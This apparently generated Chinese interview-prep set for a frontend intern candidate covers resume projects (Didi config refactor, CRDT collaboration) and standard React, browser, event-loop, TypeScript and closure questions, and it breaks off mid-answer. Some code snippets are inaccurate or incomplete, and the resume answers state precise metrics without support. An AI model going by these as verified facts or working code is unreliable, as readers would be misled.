# 腾讯PCG技术线-智能营销/AI小游戏方向 面试题（版本A）

> 候选人：谭成 | 求职意向：前端实习生  
> 面试方向：简历项目深度挖掘 + 前端八股文 + 算法编程  
> 生成时间：2025年4月7日

---

## 1. 在滴滴商旅平台业务中，你参与的最复杂的技术挑战是什么？具体是如何解决的？

## 答案

**最复杂的技术挑战：遗留系统的配置化重构**

**背景与挑战：**

滴滴商旅平台承载了机票、酒店、火车票等全品类差旅业务，覆盖57个业务模块。在我加入时，面临以下问题：

1. **硬编码泛滥**：每个业务模块的定价逻辑、审批流程都写死在代码里
2. **耦合度高**：新增一个字段需要前后端同时改动，发布周期3-5天
3. **重复代码多**：相似功能在不同模块重复实现，维护成本极高

**解决思路：**

```
问题拆解：
1. 如何将硬编码抽象为可配置的数据结构？
2. 如何设计通用的表单渲染引擎？
3. 如何保证配置变更不影响线上已有订单？
```

**具体解决方案：**

**1. 业务抽象层设计**

```typescript
// 统一的数据模型抽象
interface PolicyConfig {
  id: string;
  category: 'flight' | 'hotel' | 'train';
  rules: PolicyRule[];
  version: number;
  status: 'draft' | 'active' | 'archived';
}

interface PolicyRule {
  condition: JSONSchema;  // 条件表达式
  action: PolicyAction;   // 执行动作
  priority: number;       // 优先级
}
```

**2. JSON Schema 动态表单引擎**

```typescript
// 表单配置示例
const flightPolicySchema = {
  type: 'object',
  properties: {
    airline: {
      type: 'string',
      title: '航空公司',
      widget: 'select',
      enum: ['CA', 'MU', 'CZ'],
      enumNames: ['国航', '东航', '南航']
    },
    refundRule: {
      type: 'object',
      title: '退票规则',
      properties: {
        beforeDeparture: { type: 'number', title: '起飞前(小时)' },
        fee: { type: 'number', title: '手续费(%)' }
      }
    }
  }
};

// 渲染引擎核心
const SchemaForm: React.FC<{ schema: JSONSchema }> = ({ schema }) => {
  const fields = parseSchema(schema);
  return (
    <Form>
      {fields.map(field => (
        <FieldRenderer key={field.key} field={field} />
      ))}
    </Form>
  );
};
```

**3. 版本管理与灰度发布**

| 策略 | 实现方式 | 效果 |
|------|----------|------|
| 版本隔离 | 配置表增加 version 字段 | 新旧配置互不影响 |
| 灰度生效 | 按用户ID哈希分桶 | 逐步放量，风险可控 |
| 快速回滚 | 一键切换 active_version | 5分钟内回滚 |

**技术难点突破：**

| 难点 | 解决方案 |
|------|----------|
| 复杂条件表达式 | 引入 JSON Schema + 自定义校验器 |
| 性能要求高 | 配置预编译 + Redis 缓存 |
| 实时性要求 | 配置变更消息队列通知 + 热更新 |

**最终收益：**

- 业务迭代周期从 **3-5天** 缩短至 **1小时内**
- 代码重复率降低约 **60%**
- 产品自主配置比例达到 **80%+**

---

## 2. 你在滴滴参与的 AI Native 转型中，OpenSpec 和 SSD 规范具体是如何落地的？效果如何？

## 答案

### OpenSpec 规范定义

OpenSpec 是我们团队定义的一套结构化开发规范，用于标准化 AI 辅助开发流程：

```yaml
# OpenSpec 示例：组件生成规范
spec_version: "1.0"
component:
  name: "BusinessForm"
  type: "form"
  
  # 组件元数据
  metadata:
    author: "前端团队"
    category: "business"
    tags: ["form", "dynamic"]
  
  # Props 定义
  props:
    - name: "schema"
      type: "FormSchema"
      required: true
      description: "表单配置Schema"
    - name: "onSubmit"
      type: "(values: any) => Promise<void>"
      required: true
  
  # AI Prompt 模板
  ai_prompts:
    generate: |
      基于以下业务需求生成表单组件：
      需求：{{requirement}}
      技术栈：React + TypeScript + Ant Design
      规范要求：
      1. 使用函数组件 + Hooks
      2. Props 使用接口定义
      3. 添加 JSDoc 注释
      4. 包含基础单元测试
      
    refactor: |
      分析以下代码，按 SSD 规范重构：
      代码：{{code}}
      重构目标：{{target}}
```

### SSD 规范（Structured Skill Definition）

SSD 是面向 AI 的结构化技能定义模式：

```typescript
// Skill 定义接口
interface SkillDefinition {
  id: string;
  name: string;
  description: string;
  
  // 输入输出定义
  input: z.ZodSchema;
  output: z.ZodSchema;
  
  // Few-shot 示例
  examples: {
    input: any;
    output: any;
    explanation?: string;
  }[];
  
  // 约束条件
  constraints: string[];
  
  // 质量校验
  validators: Validator[];
}

// 实际 Skill 示例
const generateComponentSkill: SkillDefinition = {
  id: 'gen-react-component',
  name: '生成 React 组件',
  input: z.object({
    requirement: z.string(),
    techStack: z.enum(['react', 'vue']),
    componentType: z.enum(['form', 'table', 'modal'])
  }),
  output: z.object({
    code: z.string(),
    tests: z.string(),
    documentation: z.string()
  }),
  examples: [
    {
      input: { requirement: '用户登录表单', techStack: 'react', componentType: 'form' },
      output: { /* 示例代码 */ }
    }
  ],
  constraints: [
    '使用 TypeScript',
    '遵循团队 ESLint 规范',
    '包含错误处理'
  ]
};
```

### 落地效果

**收益方面：**

| 指标 | 优化前 | 优化后 | 提升 |
|------|--------|--------|------|
| 组件开发时间 | 4小时 | 1.5小时 | 62% |
| 代码规范符合率 | 60% | 95% | 58% |
| 需求评审效率 | 2天 | 4小时 | 75% |
| 技术方案评审 | 1周 | 2天 | 71% |

**具体实践：**

```
AI 辅助开发流程：

需求输入 → OpenSpec 解析 → Prompt 组装 → LLM 生成 → 代码校验 → 输出
    ↓
RAG 检索历史优秀代码作为参考
    ↓
自动单元测试生成与验证
```

### 痛点与挑战

1. **学习成本高**：新人需要理解 OpenSpec 的文件结构和 Prompt 工程
2. **灵活性不足**：简单需求使用规范略显"重"
3. **AI 幻觉问题**：生成的内容有时不符合预期，需要人工审核
4. **维护成本**：规范文档需要持续更新

---

## 3. GResume 项目中使用 Automerge (CRDT) 实现实时协作，请详细解释 CRDT 如何解决并发冲突问题？

## 答案

### CRDT 核心原理

CRDT（Conflict-free Replicated Data Type，无冲突复制数据类型）通过数学设计保证最终一致性：

**三大数学特性：**

| 特性 | 含义 | 作用 |
|------|------|------|
| 交换律 | A 合并 B = B 合并 A | 操作顺序无关 |
| 结合律 | (A 合并 B) 合并 C = A 合并 (B 合并 C) | 分组无关 |
| 幂等性 | A 合并 A = A | 重复操作无影响 |

### Automerge 实现机制

**1. 操作记录（Operation Log）**

```javascript
// 传统 OT：转换操作
// CRDT：记录所有操作历史

// 每个操作包含：
{
  actor: 'user-123',      // 操作者唯一ID
  seq: 5,                 // 序列号（单调递增）
  time: 1712500000000,    // 时间戳
  op: {                   // 具体操作
    action: 'set',
    path: ['content', 'name'],
    value: '张三'
  }
}
```

**2. 并发冲突处理示例**

```javascript
// 场景：两人同时编辑同一行
// 用户A：将 "Hello" 改为 "Hi"
// 用户B：将 "Hello" 改为 "Hey"

// 用户A的操作（基于版本 V1）
const changeA = Automerge.change(doc, d => {
  d.content = "Hi";
});

// 用户B的操作（同样基于版本 V1）
const changeB = Automerge.change(doc, d => {
  d.content = "Hey";
});

// 合并时
const merged = Automerge.merge(changeA, changeB);

// Automerge 处理：
// 1. 识别并发操作（无因果关系）
// 2. 保留两个值，标记为冲突状态
// 3. 应用层决定展示策略

console.log(Automerge.getConflicts(merged, 'content'));
// 输出：{ 'user-123:5': 'Hi', 'user-456:3': 'Hey' }
```

**3. GResume 中的四层同步架构**

```
┌─────────────────────────────────────────────────────────────┐
│                        用户操作层                            │
│              用户输入 → 本地状态更新                          │
└─────────────────────────────────────────────────────────────┘
                              ↓
┌─────────────────────────────────────────────────────────────┐
│                      乐观更新层 (Zustand)                     │
│              即时响应、记录 pending 队列                      │
└─────────────────────────────────────────────────────────────┘
                              ↓
┌─────────────────────────────────────────────────────────────┐
│                       CRDT 同步层                             │
│   • 转换为 CRDT 操作                                          │
│   • 本地应用并生成变更记录                                     │
│   • 广播给其他客户端                                          │
│   • 接收远程变更并合并                                         │
└─────────────────────────────────────────────────────────────┘
                              ↓
┌─────────────────────────────────────────────────────────────┐
│                      持久化层                                │
│   IndexedDB（本地） ←──同步──→ Supabase（云端）              │
└─────────────────────────────────────────────────────────────┘
```

### 冲突解决策略

| 场景 | 策略 | 实现 |
|------|------|------|
| 文本并发编辑 | 保留多值 | 应用层显示冲突提示 |
| 字段级冲突 | Last-Writer-Wins | 时间戳比较 |
| 数组操作 | 操作重排序 | 基于向量时钟 |
| 删除冲突 | Tombstone 标记 | 逻辑删除而非物理删除 |

---

## 4. 在 GResume 的实时协作系统中，Zustand + CRDT + IndexedDB 的三步模型是如何设计的？如何保证离线场景的数据一致性？

## 答案

### 三步模型设计

```
用户操作
   ↓
┌─────────────────────────────────────────────────────────────┐
│ Step 1: 乐观更新 (Optimistic Update) - < 16ms               │
│ • Zustand 立即更新本地状态                                   │
│ • UI 即时响应，无延迟                                         │
│ • 操作记录到 pending 队列                                     │
└─────────────────────────────────────────────────────────────┘
   ↓
┌─────────────────────────────────────────────────────────────┐
│ Step 2: CRDT 同步 (CRDT Sync) - 异步                         │
│ • 将操作转换为 CRDT 操作                                      │
│ • 本地应用并生成变更记录                                       │
│ • 广播给其他客户端（WebSocket）                                │
│ • 接收远程变更并合并                                          │
└─────────────────────────────────────────────────────────────┘
   ↓
┌─────────────────────────────────────────────────────────────┐
│ Step 3: 延迟持久化 (Deferred Persistence) - 防抖处理         │
│ • 批量写入 IndexedDB（防抖 500ms）                           │
│ • 网络恢复时同步到服务器                                       │
│ • 冲突解决后清理 pending 队列                                  │
└─────────────────────────────────────────────────────────────┘
```

### 代码实现核心

```typescript
// Zustand Store 设计
interface ResumeState {
  // 文档状态
  doc: Automerge.Doc<ResumeData>;
  
  // 同步状态
  syncStatus: 'synced' | 'syncing' | 'offline' | 'conflict';
  pendingOps: Operation[];
  
  // 操作方法
  updateField: (path: string, value: any) => void;
  applyRemoteChanges: (changes: Uint8Array[]) => void;
  persistToIndexedDB: () => Promise<void>;
}

// 中间件实现
const crdtMiddleware = (config) => (set, get, api) => {
  return config(
    (args) => {
      // Step 1: 立即更新 UI
      set(args);
      
      // Step 2: 异步 CRDT 处理
      const state = get();
      const changes = Automerge.getChanges(state.doc, newDoc);
      
      // 广播给协作用户
      broadcastChanges(changes);
      
      // Step 3: 防抖持久化
      debouncedPersist(state);
    },
    get,
    api
  );
};

// 防抖持久化
const debouncedPersist = debounce(async (state) => {
  await localDB.resumes.put({
    id: state.docId,
    data: Automerge.save(state.doc),
    timestamp: Date.now()
  });
}, 500);
```

### 离线场景数据一致性保证

**1. 本地优先策略（Local-First）**

```
用户编辑 → 本地 CRDT 变更 → 写入 IndexedDB
                     ↓
           同时更新内存状态（UI 立即响应）
                     ↓
           网络恢复后自动同步到云端
```

**2. 离线同步状态机**

```
         ┌─────────────┐
         │   Online    │
         │   (在线)    │
         └──────┬──────┘
                │ 网络断开
                ↓
         ┌─────────────┐
    ┌────│  Offline    │────┐
    │    │  (离线)     │    │
    │    └──────┬──────┘    │
    │           │           │
    ↓           ↓           ↓
┌───────┐  ┌─────────┐  ┌─────────┐
│ 本地编辑 │  │ 批量存储 │  │ 冲突检测 │
│ 继续可用 │  │ IndexedDB│  │ 准备就绪 │
└───────┘  └─────────┘  └─────────┘
                │
                │ 网络恢复
                ↓
         ┌─────────────┐
         │   Syncing   │
         │   (同步中)  │
         └──────┬──────┘
                │
                ↓
         ┌─────────────┐
         │   Synced    │
         │   (已同步)  │
         └─────────────┘
```

**3. 断点续传机制**

```typescript
// 增量同步实现
async function syncToServer() {
  // 1. 获取本地最后同步版本
  const lastSync = await localDB.syncMeta.get(docId);
  
  // 2. 获取服务器最新版本
  const serverDoc = await fetchServerDoc(docId);
  
  // 3. 计算差异
  const localChanges = await getChangesSince(lastSync?.version);
  
  // 4. 上传本地变更
  await uploadChanges(localChanges);
  
  // 5. 下载远程变更并合并
  const remoteChanges = await fetchRemoteChanges(lastSync?.version);
  const merged = Automerge.merge(localDoc, serverDoc);
  
  // 6. 更新同步标记
  await localDB.syncMeta.put({
    docId,
    version: Automerge.getHeads(merged),
    timestamp: Date.now()
  });
}
```

**4. 版本冲突解决**

| 场景 | 策略 | 用户感知 |
|------|------|----------|
| 无冲突 | 自动合并 | 无感知 |
| 字段级冲突 | Last-Writer-Wins | 可能丢失部分编辑 |
| 复杂冲突 | 提示用户选择 | 显示冲突对比界面 |

---

## 5. 请详细解释 React Fiber 架构的核心设计思想，以及它如何解决 React 15 时代的栈递归问题

## 答案

### React 15 栈递归的问题

```
传统递归渲染：

updateQueue → 递归遍历组件树 → 一次性完成所有工作
                    ↓
            主线程被阻塞
                    ↓
            动画卡顿、输入延迟

问题表现：
- 组件树过大时，JS 执行时间过长（>16ms，超过一帧时间）
- 无法中断渲染，高优先级更新（如用户输入）被延迟
- 导致页面卡顿，用户体验差
```

### React Fiber 核心设计

**1. 链表结构替代递归**

```javascript
// Fiber 节点结构
interface FiberNode {
  type: any;              // 组件类型（函数、类、DOM标签）
  key: string | null;     //  diff 标识
  stateNode: any;         // DOM 节点或组件实例
  
  // 链表指针（形成树形结构）
  child: FiberNode | null;    // 第一个子节点
  sibling: FiberNode | null;  // 下一个兄弟节点
  return: FiberNode | null;   // 父节点
  
  // 工作单元相关
  pendingProps: any;      // 新的 props
  memoizedProps: any;     // 上一次渲染的 props
  memoizedState: any;     // 上一次渲染的 state
  effectTag: number;      // 副作用标记（增删改）
  nextEffect: FiberNode | null;  // 下一个有副作用的节点
}
```

**2. 增量渲染（Time Slicing）**

```javascript
// 工作循环 - 可中断的渲染
function workLoop(deadline) {
  // 有工作且未超时
  while (nextUnitOfWork && deadline.timeRemaining() > 0) {
    // 执行一个工作单元
    nextUnitOfWork = performUnitOfWork(nextUnitOfWork);
  }
  
  if (nextUnitOfWork) {
    // 还有工作，但时间用完了，让出主线程
    requestIdleCallback(workLoop);
  } else {
    // 所有工作完成，进入提交阶段
    commitRoot();
  }
}

// 执行单个工作单元
function performUnitOfWork(fiber) {
  // 1. 处理当前 fiber（创建 DOM、调用生命周期等）
  const next = beginWork(fiber);
  
  // 2. 返回下一个工作单元
  if (next) {
    return next;  // 优先处理子节点
  }
  
  // 3. 没有子节点，处理兄弟节点或返回父节点
  let current = fiber;
  while (current) {
    completeWork(current);  // 完成当前节点工作
    
    if (current.sibling) {
      return current.sibling;  // 处理兄弟节点
    }
    current = current.return;   // 返回父节点
  }
  
  return null;  // 整棵树处理完成
}
```

**3. 优先级调度**

```javascript
// 优先级等级（数字越小优先级越高）
const priorities = {
  NoPriority: 0,
  ImmediatePriority: 1,       // 同步执行，立即更新
  UserBlockingPriority: 2,    // 用户交互（点击、输入）
  NormalPriority: 3,          // 普通更新（网络请求回调）
  LowPriority: 4,             // 低优先级（分析、日志）
  IdlePriority: 5,            // 空闲时执行（预加载）
};

// 使用示例
// 高优先级：用户输入
ReactDOM.unstable_scheduleCallback(
  UserBlockingPriority,
  () => updateInputValue(value)
);

// 低优先级：列表渲染
ReactDOM.unstable_scheduleCallback(
  LowPriority,
  () => renderLargeList(data)
);
```

**4. 双缓冲技术**

```
当前显示（Current Tree）     正在构建（Work In Progress）
       ↓                           ↓
   ┌───────┐                   ┌───────┐
   │  Root │                   │  Root │
   └───┬───┘                   └───┬───┘
       │                           │
   ┌───┴───┐                   ┌───┴───┐
   │   A   │                   │   A'  │  ← 更新中
   └───┬───┘                   └───┬───┘
       │                           │
   ┌───┴───┐                   ┌───┴───┐
   │   B   │                   │   B'  │  ← 更新中
   └───────┘                   └───────┘

渲染完成后：
root.current = workInProgress;  // 指针切换
workInProgress = current;       // 交换角色
```

### 两个阶段

| 阶段 | 名称 | 特点 | 可中断 |
|------|------|------|--------|
| 阶段1 | Render（协调） | 构建 Fiber 树，计算变化 | ✅ 可中断 |
| 阶段2 | Commit（提交） | 应用 DOM 变更，执行副作用 | ❌ 不可中断 |

---

## 6. React Hooks 的底层实现原理是什么？为什么不能在循环或条件语句中调用 Hooks？

## 答案

### Hooks 底层实现原理

```javascript
// 简化版 Hooks 实现
const React = (function() {
  let hooks = [];      // 存储所有 state
  let idx = 0;         // 当前 hook 的索引
  
  function useState(initialValue) {
    // 初始化或复用 state
    const state = hooks[idx] !== undefined ? hooks[idx] : initialValue;
    hooks[idx] = state;
    
    // 闭包保存当前索引
    const _idx = idx;
    idx++;
    
    function setState(newValue) {
      hooks[_idx] = newValue;
      render();  // 触发重新渲染
    }
    
    return [state, setState];
  }
  
  function useEffect(callback, deps) {
    const oldDeps = hooks[idx];
    const hasChanged = deps ? 
      !deps.every((dep, i) => dep === oldDeps[i]) : 
      true;
    
    if (hasChanged) {
      callback();
      hooks[idx] = deps;
    }
    idx++;
  }
  
  function render(Component) {
    idx = 0;  // 每次渲染重置索引
    const comp = Component();
    comp.render();
    return comp;
  }
  
  return { useState, useEffect, render };
})();
```

### 为什么不能放在循环/条件中

**问题分析：**

```javascript
function BadComponent({ condition }) {
  // ❌ 错误：条件调用
  if (condition) {
    const [state, setState] = useState(0);  // 条件为 false 时不执行
  }
  
  // ❌ 错误：循环调用
  for (let i = 0; i < 3; i++) {
    const [item, setItem] = useState(i);  // 每次渲染循环次数可能不同
  }
  
  const [count, setCount] = useState(0);  // 索引错乱！
}
```

**执行过程对比：**

| 渲染次数 | 正常调用 | 条件调用（第1次 condition=true） | 条件调用（第2次 condition=false） |
|---------|---------|--------------------------------|--------------------------------|
| idx=0 | useState(0) | useState(0) | 跳过 |
| idx=1 | useState('a') | useState('a') | useState('a') ← 索引错乱！|
| idx=2 | useState([]) | useState([]) | useState([]) ← 再次错乱 |

**后果：**
- Hook 的 state 对应关系错乱
- 可能导致状态混乱、组件行为异常
- React 无法正确追踪状态

### 正确做法

```javascript
function GoodComponent({ condition }) {
  // ✅ 始终在顶层调用
  const [state, setState] = useState(0);
  const [list, setList] = useState([]);
  const [count, setCount] = useState(0);
  
  // 条件逻辑放在 hook 内部处理
  const displayedState = condition ? state : null;
  
  // 动态列表使用一个 state
  useEffect(() => {
    if (condition) {
      const newList = [1, 2, 3].map(i => ({ id: i, value: i }));
      setList(newList);
    }
  }, [condition]);
}
```

### Hooks 调用规则（ESLint 检查）

```
规则 1：只在最顶层调用 Hooks
   - 不要在循环、条件或嵌套函数中调用
   
规则 2：只在 React 函数中调用 Hooks
   - 在 React 函数组件中调用
   - 在自定义 Hooks 中调用
   - 不要在普通 JavaScript 函数中调用
```

---

## 7. 请详细解释浏览器渲染机制，从输入 URL 到页面显示的全过程

## 答案

### 完整流程

```
输入 URL
   ↓
DNS 解析 → 获取 IP 地址
   ↓
建立 TCP 连接（三次握手）
   ↓
TLS/SSL 握手（HTTPS）
   ↓
发送 HTTP 请求
   ↓
服务器响应
   ↓
┌────────────────────────────────────────┐
│           浏览器渲染流水线              │
├────────────────────────────────────────┤
│ 1. 解析 HTML → DOM 树                  │
│ 2. 解析 CSS → CSSOM 树                 │
│ 3. DOM + CSSOM → Render Tree           │
│ 4. Layout（布局/重排）                  │
│ 5. Paint（绘制/重绘）                   │
│ 6. Composite（合成）                    │
└────────────────────────────────────────┘
   ↓
页面显示
```

### 关键阶段详解

**1. DNS 解析**

```
浏览器缓存 → 操作系统缓存 → 路由器缓存 → ISP DNS → 根域名服务器
   ↓
获取域名对应的 IP 地址
```

**2. TCP 三次握手**

```
客户端                    服务器
   | ---- SYN ---------> |
   |                     |
   | <--- SYN + ACK ---- |
   |                     |
   | ---- ACK ---------> |
   |                     |
   连接建立，开始传输数据
```

**3. DOM 构建**

```javascript
// HTML 解析是增量进行的
// 遇到 <script> 会阻塞解析（除非 defer/async）

<html>
  <head>
    <script src="a.js"></script>        <!-- 阻塞解析 -->
    <script src="b.js" defer></script>  <!-- 不阻塞，DOM 解析后执行 -->
    <script src="c.js" async></script>  <!-- 不阻塞，下载完立即执行 -->
  </head>
  <body>
    <div>Hello</div>
  </body>
</html>

// 解析过程：
// 1. 解析 <html>，创建 document 对象
// 2. 解析 <head>，遇到 script 阻塞
// 3. 下载并执行 a.js
// 4. 继续解析，遇到 defer/async 不阻塞
// 5. 解析 <body>，构建 DOM
// 6. DOMContentLoaded 事件
// 7. 执行 defer 脚本
```

**4. CSSOM 构建**

```
CSS 解析特点：
- 不会阻塞 HTML 解析
- 但会阻塞 Render Tree 构建（需要完整 CSSOM）
- 这就是为什么 CSS 建议放在 <head>

阻塞渲染的 CSS：
<link rel="stylesheet" href="style.css">  <!-- 阻塞渲染 -->

不阻塞的 CSS（仅打印）：
<link rel="stylesheet" href="print.css" media="print">
```

**5. Render Tree 构建**

```
DOM 树 + CSSOM 树 → Render Tree

注意：
- 只包含可见节点
- display: none 的节点被排除
- visibility: hidden 的节点包含（占用空间）
- 计算每个节点的 Computed Style
```

**6. Layout（重排）**

```javascript
// 触发重排的操作（代价高）
element.offsetHeight;  // 强制同步布局（Forced Synchronous Layout）
element.style.width = '100px';
element.style.height = '200px';  // 两次重排！

// 优化：批量修改
// 方法 1：使用 cssText
const width = '100px';
const height = '200px';
element.style.cssText = `width: ${width}; height: ${height};`;

// 方法 2：使用 class
element.classList.add('resize');

// 方法 3：离线修改
const clone = element.cloneNode(true);
clone.style.width = '100px';
clone.style.height = '200px';
element.parentNode.replaceChild(clone, element);
```

**7. Paint & Composite**

```
Paint：将 Render Tree 绘制成图层（Layer）
  ↓
Composite：GPU 合成图层，生成最终画面

性能优化技巧：
- transform 和 opacity 只触发 Composite（GPU 加速）
- 避免频繁触发 Layout 和 Paint
```

| 属性 | 触发阶段 | 性能 |
|------|---------|------|
| width/height | Layout + Paint + Composite | 差 |
| top/left | Layout + Paint + Composite | 差 |
| transform | Composite | 好 |
| opacity | Composite | 好 |

---

## 8. JavaScript 事件循环（Event Loop）的执行机制是什么？宏任务和微任务的区别和优先级？

## 答案

### 事件循环核心机制

```
┌─────────────────────────────────────────────────────────────┐
│                        Call Stack                           │
│                   （执行栈，单线程执行）                        │
└─────────────────────────────────────────────────────────────┘
                              ↑
                              │ 执行完毕
┌─────────────────────────────────────────────────────────────┐
│  ┌─────────────┐    ┌─────────────┐    ┌─────────────────┐  │
│  │  Microtask  │    │  Microtask  │    │   Microtask     │  │
│  │    Queue    │ →  │   Queue     │ →  │    Queue        │  │
│  │  (微任务队列) │    │  (nextTick) │    │ (MutationObserver)│  │
│  └─────────────┘    └─────────────┘    └─────────────────┘  │
│         ↑                                                   │
│    Promise.then,                                              │
│    queueMicrotask,                                            │
│    async/await                                                │
└─────────────────────────────────────────────────────────────┘
                              ↑
                              │ 微任务清空后
┌─────────────────────────────────────────────────────────────┐
│  ┌─────────────┐    ┌─────────────┐    ┌─────────────────┐  │
│  │  Macrotask  │ →  │  Macrotask  │ →  │    Macrotask    │  │
│  │    Queue    │    │    Queue    │    │     Queue       │  │
│  │  (宏任务队列) │    │             │    │                 │  │
│  └─────────────┘    └─────────────┘    └─────────────────┘  │
│         ↑                                                   │
│    setTimeout,                                                │
│    setInterval,                                               │
│    setImmediate,                                              │
│    I/O, UI rendering                                          │
└─────────────────────────────────────────────────────────────┘
```

### 执行顺序

```
1. 执行同步代码（Call Stack）
2. 执行所有微任务（Microtask Queue）
   - 如果微任务中产生了新的微任务，继续执行
   - 直到微任务队列为空
3. 执行一个宏任务（Macrotask Queue）
4. 重复步骤 2-3
```

### 代码示例详解

```javascript
console.log('1');  // 同步

setTimeout(() => {
  console.log('2');  // 宏任务
  
  Promise.resolve().then(() => {
    console.log('3');  // 微任务（在宏任务中产生）
  });
}, 0);

Promise.resolve().then(() => {
  console.log('4');  // 微任务
  
  setTimeout(() => {
    console.log('5');  // 宏任务（在微任务中产生）
  }, 0);
});

console.log('6');  // 同步

// 输出顺序分析：
// 1. 同步代码：1, 6
// 2. 微任务：4
// 3. 宏任务：2
// 4. 宏任务中的微任务：3
// 5. 微任务产生的宏任务：5
// 
// 最终输出：1 → 6 → 4 → 2 → 3 → 5
```

### 微任务 vs 宏任务对比

| 特性 | 微任务 | 宏任务 |
|-----|-------|-------|
| **优先级** | 高 | 低 |
| **执行时机** | 当前任务结束后立即执行 | 下一轮事件循环 |
| **典型 API** | Promise.then, queueMicrotask, MutationObserver, process.nextTick (Node) | setTimeout, setInterval, setImmediate, I/O, UI rendering |
| **风险** | 递归微任务可能阻塞渲染 | 相对安全 |
| **清空策略** | 全部清空 | 每次取一个 |

### 浏览器与 Node.js 差异

```javascript
// 浏览器环境
// 微任务：Promise.then, MutationObserver
// 宏任务：setTimeout, setInterval, I/O

// Node.js 环境
// 微任务：Promise.then, process.nextTick（优先级最高）
// 宏任务：setTimeout, setImmediate, I/O

// Node.js 特有示例
setTimeout(() => console.log('timeout'), 0);
setImmediate(() => console.log('immediate'));
Promise.resolve().then(() => console.log('promise'));
process.nextTick(() => console.log('nextTick'));

// Node.js 输出：
// nextTick → promise → timeout → immediate
// 
// 注意：setTimeout 和 setImmediate 顺序不确定
// 取决于当前事件循环的阶段
```

---

## 9. TypeScript 中的泛型（Generic）是什么？请举例说明协变、逆变和双向协变

## 答案

### 泛型基础

```typescript
// 泛型函数
function identity<T>(arg: T): T {
  return arg;
}

// 泛型接口
interface GenericResponse<T> {
  data: T;
  code: number;
  message: string;
}

// 泛型约束
interface HasLength {
  length: number;
}
function logLength<T extends HasLength>(arg: T): T {
  console.log(arg.length);
  return arg;
}

// 泛型类
class GenericNumber<T> {
  zeroValue: T;
  add: (x: T, y: T) => T;
}
```

### 型变（Variance）

```typescript
// 定义类型层次
class Animal {
  name: string = '';
  eat() {}
}

class Dog extends Animal {
  bark() {}
}

class Corgi extends Dog {
  cute() {}
}

// 类型关系：Corgi ⊆ Dog ⊆ Animal
```

### 协变（Covariant）

子类型可以赋值给父类型（保持类型兼容性方向）。

```typescript
// 数组是协变的
let animals: Animal[] = [];
let dogs: Dog[] = [new Dog()];

animals = dogs;  // ✓ 协变：Dog[] 可以赋值给 Animal[]

// 实际应用
function feedAnimals(animals: Animal[]) {
  animals.forEach(a => a.eat());
}

feedAnimals(dogs);  // ✓ 可以传入 Dog[]

// 危险（但在 TypeScript 中允许）
// animals.push(new Cat());  // 如果允许，会破坏 dogs 的类型安全
```

### 逆变（Contravariant）

父类型可以赋值给子类型（与类型兼容性方向相反）。

```typescript
// 函数参数是逆变的
type AnimalHandler = (animal: Animal) => void;
type DogHandler = (dog: Dog) => void;

let handleAnimal: AnimalHandler = (a) => console.log(a.name);
let handleDog: DogHandler = (d) => d.bark();

handleDog = handleAnimal;  // ✓ 逆变：AnimalHandler 可以赋值给 DogHandler
// 解释：handleAnimal 接收 Animal，当然也能接收 Dog

// 错误示例
// handleAnimal = handleDog;  // ✗ 错误！handleDog 期望 Dog，不能接收 Cat
```

### 双向协变（Bivariant）

既协变又逆变（TypeScript 非严格模式下）。

```typescript
// TypeScript 对函数参数默认是双向协变的（--strictFunctionTypes 关闭时）
// 开启严格模式后，函数参数变为逆变

// 方法参数（非严格模式下双向协变）
interface EventHandler {
  handle(event: Event): void;
}

// 严格模式下的正确做法
interface Comparator<T> {
  compare(a: T, b: T): number;  // 逆变
}
```

### 实际应用

```typescript
// 协变：只读数据结构（out）
interface ReadonlyContainer<out T> {
  getValue(): T;
}

// 逆变：只写数据结构（in）
interface WriteonlyContainer<in T> {
  setValue(value: T): void;
}

// 不变：读写数据结构
interface Container<T> {
  getValue(): T;
  setValue(value: T): void;
}

// TypeScript 4.7+ 显式标注
interface Producer<out T> {
  produce(): T;
}

interface Consumer<in T> {
  consume(value: T): void;
}
```

---

## 10. 什么是闭包（Closure）？请说明其原理、应用场景和可能导致的内存泄漏问题

## 答案

### 闭包原理

闭包是指函数能够记住并访问其词法作用域，即使该函数在其词法作用域之外执行。

```javascript
function outer() {
  let count = 0;  // 被闭包引用的变量
  
  function inner() {
    count++;      // 访问外部函数的变量
    return count;
  }
  
  return inner;
}

const counter = outer();  // outer 执行完毕，但 count 未被回收
console.log(counter());   // 1
console.log(counter());   // 2
console.log(counter());   // 3
```

### 内存模型

```
执行 outer() 时：
┌─────────────────────────────────────┐
│  outer 执行上下文                    │
│  - count: 0 (堆内存，被 inner 引用)   │
│  - inner 函数定义                    │
└─────────────────────────────────────┘
           ↓
outer 执行完毕，执行上下文弹出栈
           ↓
但 count 仍在堆内存中（被返回的 inner 引用）
           ↓
counter() 调用时，通过作用域链找到 count
```

### 应用场景

**1. 数据私有化（模块模式）**

```javascript
const createCounter = () => {
  let count = 0;
  
  return {
    increment: () => ++count,
    decrement: () => --count,
    getCount: () => count
  };
};

const counter = createCounter();
console.log(counter.getCount());  // 0
counter.increment();
console.log(counter.getCount());  // 1
// count 无法从外部直接访问
```

**2. 函数柯里化**

```javascript
const add = (a) => (b) => a + b;
const add5 = add(5);  // 闭包保存 a=5
console.log(add5(3));  // 8
console.log(add5(10)); // 15
```

**3. 防抖/节流**

```javascript
function debounce(fn, delay) {
  let timer;  // 闭包保存 timer
  
  return function(...args) {
    clearTimeout(timer);
    timer = setTimeout(() => fn.apply(this, args), delay);
  };
}

const handleSearch = debounce((query) => {
  console.log('Searching:', query);
}, 300);

// 频繁调用只执行最后一次
handleSearch('a');
handleSearch('ab');
handleSearch('abc');  // 只有这个会执行
```

### 内存泄漏风险

**1. 意外闭包导致大对象无法回收**

```javascript
// ❌ 问题：意外闭包导致大对象无法回收
function processData() {
  const hugeData = new Array(1000000).fill('x');
  
  return function() {
    console.log('processed');  // 没有引用 hugeData，但...
  };
}

// V8 优化后可能回收，但某些引擎会保留整个作用域

// ✅ 解决方案：显式解除引用
function processDataSafe() {
  const hugeData = new Array(1000000).fill('x');
  const result = process(hugeData);
  
  return function() {
    console.log(result);  // 只引用需要的结果
  };
}
```

**2. React 中的闭包陷阱**

```javascript
// ❌ 闭包陷阱：永远输出 0
function Component() {
  const [count, setCount] = useState(0);
  
  useEffect(() => {
    const timer = setInterval(() => {
      console.log(count);  // 永远输出 0（闭包陷阱）
    }, 1000);
    return () => clearInterval(timer);
  }, []);  // 依赖数组为空，count 永远是初始值
}

// ✅ 解决方案 1：使用函数式更新
function Component() {
  const [count, setCount] = useState(0);
  
  useEffect(() => {
    const timer = setInterval(() => {
      setCount(c => c + 1);  // 使用函数式更新
    }, 1000);
